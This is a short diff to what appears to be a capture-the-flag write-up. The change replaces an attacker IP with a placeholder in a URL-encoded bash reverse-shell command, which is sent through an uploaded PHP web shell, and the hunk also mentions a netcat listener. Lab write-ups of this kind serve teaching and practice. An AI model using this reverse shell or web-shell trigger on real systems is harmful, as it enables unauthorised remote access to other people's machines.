@@ -37,7 +37,7 @@ I then create a listener (`nc -lnvp 1337`) and trigger the shell:
 
 ```
 http://10.10.151.169/shell.php?cmd=id
-http://10.10.151.169/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.9.1.194/1337+0>%261'
+http://10.10.151.169/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/MY-IP/1337+0>%261'
 ```
 
 An I am now in the target machine.
